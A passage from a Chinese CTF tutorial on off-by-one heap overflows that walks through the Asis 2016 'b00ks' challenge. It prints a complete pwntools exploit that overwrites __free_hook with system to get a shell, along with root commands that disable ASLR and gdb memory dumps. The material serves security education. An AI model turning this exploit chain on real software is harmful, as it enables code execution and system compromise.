> 注意：本程序exp已经过验证，为有效payload，请勿使用ubuntu 16.04进行执行（libc-2.23），否则无法getshell
>

---

> 参考资料：
>
> [https://wzt.ac.cn/2018/10/08/s-pwn-project-2/](https://wzt.ac.cn/2018/10/08/s-pwn-project-2/)   #payload来源
>
> [https://blog.csdn.net/qq_41202237/article/details/108116618](https://blog.csdn.net/qq_41202237/article/details/108116618)  #主要行文思路
>

---

> 附件下载：
>
> 链接：[https://pan.baidu.com/s/1A3O9oTaXh2DANTDZPQGj8g](https://pan.baidu.com/s/1A3O9oTaXh2DANTDZPQGj8g)
>
> 提取码：yntv
>

# 简介及定义
off-by-one这项技术不仅适用于堆，**而且适用于栈**。但是在CTF中最常见的还是在堆中的应用。严格来说off-by-one是一种特殊的溢出漏洞，当程序在缓冲区写入并溢出时，写入的字节数超过了这个缓冲区本身所申请的字节数且只越界了一个字节。

# 漏洞原理
off-by-one这种漏洞的形成和整形溢出很相似，往往都是由于对边界的检查不够严谨，当然也不排除和写入的size正好就只多了一个字节的情况。边界验证不严谨通常有两种情况：

+ 使用循环语句向堆块中写入数据时，循环的次数设置错误，导致多写入了一个字节，这篇文章讲的就是这个漏洞
+ 对字符串长度判断有误

# 漏洞原理举例
## 0、for循环语法回顾
首先来回顾一下for循环的语法：

```cpp
for ( init; condition; increment )
{
   statement(s);
}
```

下面是 for 循环的控制流：

1. **init** 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。<u>您也可以不在这里写任何语句，只要有一个分号出现即可。</u>
2. 接下来，会判断 **condition**。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。
3. **<font style="color:#F5222D;">在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。</font>**该语句可以留空，只要在条件后有一个分号出现即可。
4. 条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。

## 1、溢出之循环边界不严谨
```c
#include<stdio.h>
#include<string.h>
int my_gets(char *ptr,int size)
{
    int i;
    for(i = 0; i <= size; i++)
    {
        ptr[i] = getchar();
    }
    return i;
}
int main()
{
    char *chunk1,*chunk2;
    chunk1 = (char *)malloc(16);
    chunk2 = (char *)malloc(16);
    puts("Get Input:");
    my_gets(chunk1, 16);
    return 0;
}
```

上面这个例子首先创建了两个char类型的指针，分别指向malloc(16)出来的chunk1和chunk2。接着调用my_gets函数传入了chunk1的指针和16byte大小的空间，进入for循环调用getchar函数进行输入。

值得注意的是：for循环这个语句：for(i = 0; i <= 16; i++)，由于i是从0开始的，**并且i<=16，也就是说循环实际上是执行了17次的，这就导致了chunk1会溢出一个字节。**

## 2、对字符串长度判断有误
代码如下：

```c
#include<stdio.h>
#include<malloc.h>
#include<string.h>
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;
}
```

> strlen函数的声明如下：
>
> size_t strlen(const char *str)
>
> C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，**<font style="color:#F5222D;">直到空结束字符，但不包括空结束字符</font>**。
>
> **<font style="color:#F5222D;">（请注意这一点，这对if语句的判断十分重要）</font>**
>

来看一下这个程序的流程：首先创建了40字节的字符串buffer，然后void出一个chunk指针指向malloc(24)，利用gets函数对buffer进行输入，如果是输入的为24字节就使用strcpy复制到堆中。

请注意：有一个隐形的东西值得我们注意--字符串结束符\x00。调用gets函数后，\x00会自动的添加在输入的字符串中，当strcpy进行拷贝时，会将\x00存入到堆块中，进一步说chunk1中写入了25个字节。这就导致了chunk1溢出了一个字节。

# 实例讲解
我们使用CTF-wiki上的Asis_2016_b00ks进行讲解

> 下载链接：[https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)
>

首先检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599480856859-72815fae-7c60-43ff-89cb-f479b7428f85.png)

可以看到这是64位程序，除了canary保护其他全开。

由于这是一个简单的讲解，所以我们可以将PIE保护关掉，进一步说我们可以关掉Linux系统的ASLR。

> 关闭系统的ASLR，执行命令：
>
> $ sudo su
>
> [sudo] password : 你自己的密码
>
> cat /proc/sys/kernel/randomize_va_space
>
> echo 0 > /proc/sys/kernel/randomize_va_space
>
> cat /proc/sys/kernel/randomize_va_space
>
> 请不要担心，**重启虚拟机之后ASLR会自动开启**
>

# 程序流程
将程序下载下来，执行命令“chmod 777 b00ks”授予ELF文件权限以执行。

运行一下，粗略的查看一下程序的执行流程：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599481597117-30c31626-a18a-48ae-8734-e3f68a960684.png)

程序运行程序之后输入一个作者的名称，接着出来几个选项让我们选择（如下图所示）：

1、创建图书

2、删除图书

3、编辑图书

4、打印所有图书的详细信息

5、更改现有的作者名称

## 1-0、创建图书
我们来看一下创建图书的功能

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599482367308-3ab7ac98-c771-474e-86ed-8350ffe381dd.png)

这个功能很简单，我们只需要输入四个内容：书名大小、书名、书类型大小、书类型

> description：描述
>

可以通过payload自动化调用程序中的create函数，以代替我们手动创建图书，使用payload表示如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599981765315-c03ac08e-7a39-48a0-a22f-72aec5d28b7b.png)

## 2、删除图书
使用删除功能需要输入图书的id，图书的id是创建图书的时候就开始从1分配的，可以创建payload的deletebook函数来进行自动化删除。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599486645321-d50a1c2f-6493-4737-835e-58a44297c19f.png)

使用payload表示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599981790608-ba142a4e-8a90-465e-9696-56092f7ea8d4.png)

## 1-1、编辑图书
由于我们上面将刚刚创建的图书内容进行了删除，所以需要重新创建book：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599486832842-291f0173-e254-4c2b-ba1e-332215d1683e.png)

然后我们再来打印出book的详细信息：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599486910832-5af1afbe-a641-4f83-acdc-dfd0ebd0bdde.png)

从上面输出的信息可以看到，当第一个图书的信息被删除之后，重新录入后的book并不会使用之前被删除的ID，而是递增使用新ID。

## 3、修改图书的类型
在程序中输入3以修改图书的类型：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599487752280-ac32763e-70e4-463b-bbb0-6f9214800ce4.png)

然后再打印一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599487854009-0a2ab6e2-a79f-4e30-b748-98c50ebcf041.png)

修改图书类型需要输入两个内容：图书id、新的图书类型，payload如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599981856043-ae9bc592-cec0-480a-9c9e-7b6799bbb77a.png)

## 4、打印图书的信息
直接打印一下图书的数据信息，当然，和上面的一样：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599488648197-c7101193-8169-48cf-8c2c-d301e6e60da6.png)

打印信息只需要输入程序功能的序号4就会打印出所有的图书信息：图书id、书名、书的类型、作者名。使用payload传入程序功能序号4就行了。

## 5、修改作者名
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599489842503-44075e36-4ab9-4b74-8337-d7f2a1873368.png)

这个功能只需要我们输入新的作者名，可以使用payload中向程序中传入5以执行修改作者名的功能。

# IDA静态分析
大概的内容看完了，接下来就该看IDA的静态分析了。

IDA在堆中的作用很大，它可以帮助我们分析出程序的漏洞。

## main函数分析
将文件载入到IDA中，首先先来看main函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599525051203-2fa65adb-6188-430a-bce3-41a973ba3ceb.png)

如上图所示，已经对main函数进行了注释，接下来重点看程序的主要功能，首先进入sub_B6D()，大致的语句注释如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599525501753-b2e12c43-3b88-4224-8e3f-5e5fab4c4577.png)

由于已经对函数和变量进行了重命名，我们可以先双击read_data_to_heap来看一下此函数：（请注意传入的参数）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599525617563-71430df1-eb5b-45c6-ba59-aaf473bb8131.png)

从上面的图可以看出存在着for循环，经过仔细的分析发现循环实际上是运行了33次。

文章开头我们可以知道这里存在着单字节溢出漏洞。

返回，看一下book_author_name_ptr：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599525843975-59e90a54-b578-40ee-bc29-249b12de2a47.png)

可以看到这个变量的指针保存在offset的0x202018处。请在记事本中记下这个地址，之后要使用到。

## 创建图书功能分析
sub_F55函数和注释如下：

```c
signed __int64 sub_F55()
{
  int input; // [rsp+0h] [rbp-20h]
  int book_id; // [rsp+4h] [rbp-1Ch]
  void *book_information_ptr; // [rsp+8h] [rbp-18h]
  void *book_name_ptr; // [rsp+10h] [rbp-10h]
  void *book_description_ptr; // [rsp+18h] [rbp-8h]

  input = 0;                                    // input在栈中
  printf("\nEnter book name size: ", *(_QWORD *)&input);
  __isoc99_scanf("%d", &input);                 // 输入book_name_size
  if ( input >= 0 )
  {
    printf("Enter book name (Max 32 chars): ", &input);
    book_name_ptr = malloc(input);              // 创建一个book_name_size大小的堆
    if ( book_name_ptr )
    {                                           // book_name_size大小的堆创建成功
      if ( (unsigned int)read_data_to_heap(book_name_ptr, input - 1) )// 向堆中输入book_name
      {
        printf("fail to read name");
      }
      else
      {
        input = 0;                              // input清零
        printf("\nEnter book description size: ", *(_QWORD *)&input);
        __isoc99_scanf("%d", &input);           // 输入书类型的大小
        if ( input >= 0 )
        {
          book_description_ptr = malloc(input); // 创建book_description_size大小的堆
          if ( book_description_ptr )
          {
            printf("Enter book description: ", &input);
            if ( (unsigned int)read_data_to_heap(book_description_ptr, input - 1) )// 将book_description写入堆中
            {
              printf("Unable to read description");
            }
            else
            {
              book_id = sub_B24();              // 为书籍分配book_id
              if ( book_id == -1 )
              {
                printf("Library is full");
              }
              else
              {
                book_information_ptr = malloc(32uLL);// 创建大小为32的堆
                if ( book_information_ptr )
                {
                  *((_DWORD *)book_information_ptr + 6) = input;// 存放书类型的大小
                  *((_QWORD *)book_struct_ptr + book_id) = book_information_ptr;
                  *((_QWORD *)book_information_ptr + 2) = book_description_ptr;
                  *((_QWORD *)book_information_ptr + 1) = book_name_ptr;
                  *(_DWORD *)book_information_ptr = ++::book_id;// 存放book_id
                  return 0LL;
                }
                printf("Unable to allocate book struct");
              }
            }
          }
          else
          {
            printf("Fail to allocate memory", &input);
          }
        }
        else
        {
          printf("Malformed size", &input);
        }
      }
    }
    else
    {                                           // book_name_size大小的堆未创建成功
      printf("unable to allocate enough space");
    }
  }
  else
  {
    printf("Malformed size", &input);
  }
  if ( book_name_ptr )
    free(book_name_ptr);
  if ( book_description_ptr )
    free(book_description_ptr);
  if ( book_information_ptr )
    free(book_information_ptr);
  return 1LL;
}
```

函数的具体执行流程就不仔细说了，看一下函数sub_B24()，这个函数主要用来为创建的书籍进行分配ID：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599526492302-4f387dc1-426c-49e0-8722-fe62199710f9.png)

回到前一个函数，有：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599526875961-d0617db7-b941-417b-9a87-f298268fafc3.png)

从上面的if语句，我们可以得到一个struct结构体，如下

```c
struct book
{
    int id;
    char *name_ptr;
    char *description_ptr;
    int size;
}
```

双击上图中的book_struct_ptr，进入：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599527032187-9489f3b8-cfec-46a9-8eff-bfb93b312954.png)

仔细的研究一下这个图：

off_202018地址中存放的是图书作者名指针，这个指针指向的地址是unk_202060

off_202010地址中存放的是图书的结构体指针，这个指针指向的地址为unk_202040

还记得之前for循环溢出（off-by-one）的问题吗？由于off_202018和off_202010紧紧联系在一起，因此两个指针所指向的内容unk_202060与unk_202040也是连接在一起的。如果我们输入32个字节的作者名字符串，那么循环多出来的一次会将\x00写入到off_202010起始第一个字节（也就是unk_202060的第一个字节），进一步来说会将创建的第一本图书结构体的低字节覆盖掉。

这样说你觉得可能没有什么概念，但是别担心，之后的动态调试会进行详细的讲解。

## 修改图书内容功能分析
返回main函数的界面，进入sub_E17函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599527812351-16ce5138-fc3b-455e-a2d2-a200c3889fab.png)

大致看一下这个函数，输入edit_id，根据这个变量对录入的book结构体的内容进行修改，大致了解一下就行了。

## 删除图书功能
接下来是删除图书的功能，进入函数sub_BBD

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599528218553-e2d874d3-df2a-4860-9c2b-e3400834f22f.png)

这个函数也是通过book_id来对图书的信息进行删除，对struct结构体中的内容进行了free。

## 打印图书信息功能分析
进入函数sub_D1F()：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599528500345-1b6385f1-55bc-42a2-af77-eb8ef92e5c28.png)

这个函数显而易见，对图书的每一个结构体进行了遍历，并打印出book结构体的信息。

## 修改作者名功能分析
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599528638791-dfdd6124-e6c0-400f-b947-cfc18a2d6f1b.png)

简单的分析一下，依然是直接调用read_data_to_heap函数将新输入的作者名写入到堆中，用户名的长度依然是32字节。

## 总结
到目前为止，程序的所有函数关键点已经分析完成，我们需要记以下下几个关键点：

+ 作者名存放在off_202018地址的指针中，这个指针指向的空间大小一共32个字节。
+ 图书结构体指针存放在地址off_202010中
+ sub_9F5()函数存在off-by-one漏洞，**<font style="color:#F5222D;">在首次创建作者名或修改作者名的时候，</font>****<font style="color:#F5222D;">如果填写32个字节的任意字符串，那么就会导致</font>**`**<font style="color:#F5222D;">\x00</font>**`**<font style="color:#F5222D;">溢出到off_202018的低位（这一点很重要！）</font>**

# 思路讲解及动态调试
到了动态调试的部分了，记得把系统的ASLR关闭并授予程序权限以运行。

先来贴一下exp吧，没有exp进行讲解就没有灵魂：

> exp大致看一下，有个印象就行了
>

```python
from pwn import *
import time
context(log_level='DEBUG')

def create(name_len, name, desc_len, desc):
    p.sendline("1")
    p.recvuntil("Enter book name size: ")
    p.sendline(str(name_len))
    p.recvuntil("Enter book name (Max 32 chars): ")
    p.sendline(name)
    p.recvuntil("Enter book description size: ")
    p.sendline(str(desc_len))
    p.recvuntil("Enter book description: ")
    p.sendline(desc)

def delete(index):
    p.sendline("2")
    p.recvuntil("Enter the book id you want to delete: ")
    p.sendline(str(index))

def edit(index, desc):
    p.sendline("3")
    p.recvuntil("Enter the book id you want to edit: ")
    p.sendline(str(index))
    p.recvuntil("Enter new book description: ")
    p.sendline(desc)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.info("Loading program...")
p = process("./b00ks")
log.success("Load success!")
p.recvuntil("Enter author name: ")
p.sendline("a" * 32)
time.sleep(1)
log.info("Off-BY-NULL!")
time.sleep(1)
p.recvuntil("> ")
create(10, "book1_name", 200, "book1_desc")
create(0x21000, "book2_name", 0x21000, "book2_desc")
p.recvuntil("> ")
time.sleep(1)
log.info("Leaking book_1's address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Author: ")
p.recv(32)
book1_addr = u64(p.recv(6) + '\x00\x00')
log.success("Book1_addr : 0x%x" % book1_addr)
time.sleep(1)
log.info("Calculating book_2's address...")
time.sleep(1)
book2_addr = book1_addr + 0x30
log.success("Book2_addr : 0x%x" % book2_addr)
time.sleep(1)
p.recvuntil("> ")
time.sleep(1)
log.info("Prepare to construct a fake book...")
payload = 'a' * 0x70 + p64(1) + p64(book2_addr + 8) + p64(book2_addr + 8) + p64(0xffff)
edit(1, payload)
time.sleep(1)
log.success("Fake book constructed! And two pointers were set to book2.")
time.sleep(1)
p.recvuntil("> ")
log.info("Off-BY-NULL again! Now Book1 was set to the fake book.")
p.sendline("5")
p.recvuntil("Enter author name: ")
p.sendline('a' * 32)
p.recvuntil("> ")
time.sleep(1)
log.info("Leaking mmap address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Name: ")
mmap_addr = u64(p.recv(6) + '\x00\x00')
time.sleep(1)
log.success("Mmap address : 0x%x" % mmap_addr)
time.sleep(1)
p.recvuntil("> ")
time.sleep(1)
log.info("Calculating libc's base")
time.sleep(1)
libc_addr = 0x7ffff79e4000   # Change it if doesn't work!
#这里存在另一种写法，之后再说。
time.sleep(1)
log.success("Libc's addr : 0x%x" % libc_addr)
time.sleep(1)
log.info("Searching __free_hook & system & /bin/sh in libc...")
free_hook = libc.symbols["__free_hook"] + libc_addr
system = libc.symbols["system"] + libc_addr
binsh = libc.search("/bin/sh").next() + libc_addr
time.sleep(1)
log.success("__free_hook address: 0x%x" % free_hook)
log.success("system address: 0x%x" % system)
log.success("/bin/sh address: 0x%x" % binsh)
time.sleep(1)
log.info("Changing book2's pointers...")
time.sleep(1)
payload2 = p64(binsh) + p64(free_hook)
edit(1, payload2)
p.recvuntil("> ")
time.sleep(1)
log.success("Book2's name and description's pointer has been changed!")
log.info("Book2's name --> /bin/sh")
log.info("Book2's desc --> free_hook")
log.info("Prepare to change book2's description, also known as __free_hook.")
time.sleep(1)
payload3 = p64(system)
edit(2,payload3)
p.recvuntil("> ")
time.sleep(1)
log.success("Now __free_hook's address is system's address!")
log.info("We just need to free book2.")
time.sleep(1)
delete(2)
log.info("Ready in 3 seconds...")
time.sleep(3)
log.success("PWN!!")

p.interactive()
```

gdb调试，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982490929-37023677-899f-4a28-9da9-80fde31f3d1d.png)

从上面这张图看到，一开始输入32个字节的任意字符：“aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”，这样我们就将存放作者名称的填满，并且使其发生了溢出。

对应的payload如下：

```python
p.recvuntil("Enter author name: ")
p.sendline("a" * 32)
```

接着我们**<font style="color:#F5222D;">Ctrl+C</font>****<font style="color:#F5222D;">进入调试界面</font>**<font style="color:#000000;">，定位刚刚输入的字符串，我们介绍两种方式</font>

## <font style="color:#000000;">1、定位输入的作者名的地址</font>
### 第一种方式
<font style="color:#000000;">因为在IDA里可以看出作者名存放在off_202018（）中，因此我们只需要知道</font>**<font style="color:#F5222D;">代码段的基地址</font>**<font style="color:#000000;">再加上</font><font style="color:#000000;">off_202018的偏移就可以找到存放作者名的指针了。</font>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599531848175-30ee32ab-c0fa-4786-a29a-f9f7e9bd5d4d.png)

<font style="color:#000000;">off_202018指的是在偏移为0x202018，那么将代码段（code段）的起始地址加上</font><font style="color:#000000;">0x202018的偏移就可以得到存放作者名指针的地址了，可以使用pwngdb中的“vmmap”查看一下代码段的起始地址：</font>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982691469-fca923ef-becc-4b89-a2a1-c082ca5d8cfd.png)  
<font style="color:#000000;">第一行的红色字段就是代码段的范围，其范围为：0x555555554000-</font><font style="color:#000000;">0x555555556000</font>

<font style="color:#000000;">因此，存放作者名指针的地址为：</font>0x555555754000 + 0x202018 = 0x555555756018

使用命令“x/16gx 0x555555756018”查看一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982735784-20771301-41f0-48d0-9918-5efc4f7f6830.png)

从上图我们可以看到0x555555756018处存放0x0000555555756040，而地址0x0000555555756040存放的就是我们输入的32个字节的作者名。

---

附：堆中的字符读取顺序如下：（请注意小端序）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599537359544-9e9caeca-c765-44a3-876a-809f677075a8.png)

> **堆的生长方向是从低地址向高地址生长的**
>

---

### 第二种方式
我们可以使用pwngdb的search命令进行搜索：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982837698-f4c56042-e7d8-4b0d-9a5c-50790da3559e.png)

可以看到字符串存放的地址0x555555756040，输入命令x/16gx 0x555555756040就可以看到字符串了。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982881448-c70847b8-eecd-4a97-b4b7-3f360364c551.png)

请注意上图红方框中的\x00，这个就是通过第33次for循环写入的。

## 2、泄露出图书结构体指针
从上面我们得到了作者名的存放地址，接下来我们要泄露出图书结构体指针。

**<font style="color:#F5222D;">请记住，作者名内容的地址和图书的结构体内容的地址是连接在一起的。</font>**

**<font style="color:#F5222D;">回到程序，输入命令c回到程序执行的界面，输入1以创建图书：</font>**

+ 创建book1：书名size=10，书名随便写（这里我写book1_name），图书的类型大小=200，类型随便写（这里我写book1_desc）
+ 创建book2：书名size = 0x21000 = 135168，书名随便写（这里我写book2_name），类型大小 = 135168，类型随便写（这里我写book2_desc）

结果如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599983094846-eb0ded69-76eb-4d74-a507-29a28c4b73ac.png)

对应的payload如下：

```python
create(10, "book1_name", 200, "book1_desc")
create(0x21000, "book2_name", 0x21000, "book2_desc")
```

> 为什么要这样输入呢？不要着急，先记下来，之后再说
>

接着我们输入按下**<font style="color:#F5222D;">“ctrl +c”</font>**回到调试界面。这一次我们定位一下两本书结构体的位置，因为指向book结构体的指针存放在off_202010中，所以还是用刚才的方法数据段起始地址加上偏移：

0x555555754000 + 0x202010 = 0x555555756010

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599539234927-92ac3ccd-8273-4052-bf92-4e66d680f9a5.png)

输入命令 x/16gx 0x555555756010 查看一下off_202010：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599983301240-f2d645a3-857d-4344-987f-4d93f56e051e.png)

可以看到地址0x555555756060存放的是book1结构体的起始地址，地址0x555555756068存放的是book2结构体的起始地址。

回顾一下之前的图：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599982881448-c70847b8-eecd-4a97-b4b7-3f360364c551.png)

在之前的篇幅中可以知道作者名和book结构体指针相连。当输入32字节的作者名时，由于for循环的失误导致book结构体地址的地位被覆盖为\x00，在我们输入book结构体之后，结构体的地址被覆盖为\x60。

> 补充一下printf的特性：**<font style="color:#F5222D;">printf函数打印内容时，打印到</font>****<font style="color:#F5222D;">\x00处停止</font>**
>

经过之前的操作book结构体的地址低位被覆盖为\x60，因此它会将book1的结构体地址打印出来

（由于**<font style="color:#F5222D;">\x00</font>**的存在不会打印book2的地址）

我们试一下，输入命令c回到程序中，输入4打印图书信息。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599983512762-c22aa14e-35d5-41a9-b5dc-072656555956.png)

尝试将0x555555756060处的0x0000555555757760、0x0000555555757790拷贝到HxD中，看一下：

（我使用"00"对两个字符串进行分割、请注意小端序）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599983630573-b025799b-ceda-4184-b199-1bc5c745e4b7.png)

可以看到book1结构体的地址已经被泄露了出来，但是由于printf截断的特性（打印到\x00停止）只输出了book1结构体指针。如果想要看到正常的16位地址，可以转换一下：

```python
from pwn import *
Cyberangel1 = '这里写打印出来的字符串'
Cyberangel2 = u64（Cyberangel1.ljust（8，"\x00"））
print hex(Cyberangel2)
```

这里就不再演示了，有兴趣的话以下执行一下脚本。

利用payload进行自动化执行代码如下：

```python
log.info("Leaking book_1's address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Author: ")
p.recv(32)
book1_addr = u64(p.recv(6) + '\x00\x00')
```

## 3、覆盖原有的结构体指针
在之前我们已经泄露出了book1结构体的指针，**<font style="color:#F5222D;">ctrl+c</font>**进入调试，输入命令“x/20gx 0x0000555555757760”以查看结构体的信息：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599984179792-35bf2204-e196-404f-98c6-12a77bb34640.png)

```python
pwndbg> x/20gx 0x0000555555757760
0x555555757760:	0x0000000000000001	0x0000555555757670 #book1结构体范围
0x555555757770:	0x0000555555757690	0x00000000000000c8 #book1结构体范围
0x555555757780:	0x0000000000000000	0x0000000000000031 #book1结构体范围
0x555555757790:	0x0000000000000002	0x00007ffff7fc0010 #book2结构体范围
0x5555557577a0:	0x00007ffff7f9e010	0x0000000000021000 #book2结构体范围
0x5555557577b0:	0x0000000000000000	0x0000000000020851 #book2结构体范围
0x5555557577c0:	0x0000000000000000	0x0000000000000000
0x5555557577d0:	0x0000000000000000	0x0000000000000000
0x5555557577e0:	0x0000000000000000	0x0000000000000000
0x5555557577f0:	0x0000000000000000	0x0000000000000000
pwndbg> 

```

可以看到上半部分就是book1的结构体，下半部分为book2的结构体，我们这里看book1的结构体：

+ 0x555555757760：book1_id
+ 0x555555757768：book1_name：0x0000555555757670
+ 0x555555757770：book1_desc：0x0000555555757690

那记事本记一下：0x555555757770这个地址存放的是book1_desc的地址，请记住这个地址，之后要用到。



我们在这里停一下，思考一下：既然book1的结构体指针低位能够覆盖作者名的\x00，那么作者名的\x00是不是也可以覆盖结构体指针的低位呢？

正好这个程序有一个修改作者名的功能，输入新的作者名依然会存放在0x202018中，我们可以预想一下：现在book1的结构体起始地址为0x0000555555757760，那么被覆盖之后就会变为0x0000555555757700，地址0x0000555555757700存放的是什么呢？答案是book1_desc的地址。

---

如果你是一步一步跟着我做的话，现在应该在终端输入c继续运行：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599984643039-fbb21e55-4c4b-4158-a17e-e8415bc32ddd.png)

接着ctrl+c回到调试界面，重新找到作者名的位置：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599984705380-efc8dad8-189b-4b49-816e-6779a481d107.png)

可以看到0x555555756060处的0x555555757760（book1的结构体起始地址）变成了0x555555757700，

0x555555757700的位置就是刚才存放book1_desc的地址。

现在我们去想想一想，调用一本书的流程：首先是和图书id对应着图书的结构体指针，结构体指针对应着结构体，结构体带动其中的成员变量。那么上图我们通过\x00覆盖之后原有的结构体指针变成了0x555555757700，那么程序就会去0x555555757700的位置寻找结构体。如果我们在原有的book1的book1_desc的位置伪造一个结构体，然后在进行\x00覆盖，那么就把伪造的结构体当做book1来实现。

> 借用并修改一下CSDN上**<font style="color:#F5222D;">@hollk</font>**大佬的图片
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600089601541-28d696d1-0faa-4d2d-b3ff-62aa7b77d211.png)

对应的payload如下：

```python
p.recvuntil("Enter author name: ")
p.sendline('a' * 32)
```

> 此步骤原本是在“伪造结构体并泄露book2书名、内容地址”之后的，为了方便理解，我将它提到了前面。
>

## 4、伪造结构体并泄露book2_name、book2_desc
接下来需要考虑的就是我们伪造结构体里面的成员变量应该写什么，在这一部分首先解答一下前面遗留的问题。为什么book2的书名大小和书名类别大小要设置为135168呢？

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599986142910-c6c84698-98fe-4592-ad09-c74b3edb8426.png)

> 0x7ffff7f9e000     0x7ffff7fe4000 rw-p    46000 0  为mmap扩展的堆空间
>

这是因为我们要申请一个超大块的空间，使得堆以mmap的形式进行扩展；由于申请的空间过大，因此mmap申请的这个空间会以单独的段形式表示。

Q：那么为什么是135168个字节呢？

A：只有接近或超过top_chunk的size大小的时候才会使用mmap进行拓展，具体的数字需要尝试几次。如果发现上图mmap位置出现，就可以判断输入多大的数值了。或者**像我这样没有标识mmap位置的话，可以查看是否存在紫色不断变换空间大小的data段**

进一步：由于关闭了ASLR保护，所以libc.so的基地址就不会发生改变了，因为book2的结构体成员的地址所属为mmap申请的空间，那么mmap地址不变、libc.so基地址不变，就会导致book2成员变量中的地址所在位置距离libc.so的偏移不变。那么如果可以通过泄露book2结构体成员变量中的地址的话，减去这个这个偏移就会得到libc.so的基地址。一旦得到了libc.so的基地址，我们可以利用pwntools找到一些可以利用的函数了。

说了这么多有什么用呢，如果想要达到上面的效果，那么就要从部署伪造的结构体开始。首先是fake_book1_id，既然我们想要完全将原有的book1替换掉，那么fake_book1_id就必须为1，这样才能按照第一个book的形式替代原有的book1。接下来是fake_book1_name，这里我们将指向book2_name的地址，fake_book1_desc指向book2_desc的地址。这样一来我们再一次执行打印功能的时候就会将book2_name和book2_desc的地址打印出来了。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599986982537-12f59024-9ae2-4267-b9f1-25d6005b57d3.png)



利用前面的图片可以顺利的找到存放book2内容的地址，来看一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1599987885680-3a6a2844-71a7-4d5e-9865-1656ef59394a.png)

可以看到book2_name就在`0x555555757798`的位置，book2_desc在`0x5555557577a0`的位置 。

接下来查看一下伪造结构体前内存地址的内容：

```python
pwndbg> x/30gx 0x0000555555757700
0x555555757700:	0x0000000000000000	0x0000000000000000 
0x555555757710:	0x0000000000000000	0x0000000000000000
0x555555757720:	0x0000000000000000	0x0000000000000000
0x555555757730:	0x0000000000000000	0x0000000000000000
0x555555757740:	0x0000000000000000	0x0000000000000000
0x555555757750:	0x0000000000000000	0x0000000000000031
0x555555757760:	0x0000000000000001	0x0000555555757670 #book1结构体范围
0x555555757770:	0x0000555555757690	0x00000000000000c8 #book1结构体范围
0x555555757780:	0x0000000000000000	0x0000000000000031 #book1结构体范围
0x555555757790:	0x0000000000000002	0x00007ffff7fc0010 #book2结构体范围
0x5555557577a0:	0x00007ffff7f9e010	0x0000000000021000 #book2结构体范围
0x5555557577b0:	0x0000000000000000	0x0000000000020851 #book2结构体范围
0x5555557577c0:	0x0000000000000000	0x0000000000000000
0x5555557577d0:	0x0000000000000000	0x0000000000000000
0x5555557577e0:	0x0000000000000000	0x0000000000000000
```

可以看到，内容是空的，接下来我们进行伪造，执行以下payload，并对其进行gdb.attach：

```python
log.info("Prepare to construct a fake book...")
payload = 'a' * 0x70 + p64(1) + p64(book2_addr + 8) + p64(book2_addr + 8) + p64(0xffff)
#book2_addr=0x555555757790
edit(1, payload)
#gdb.attach(p)
```

> 原作者注：第一项 'a' * 0x70 是填充作用，将地址填充到目标位置，可以通过多次调试找出。
>

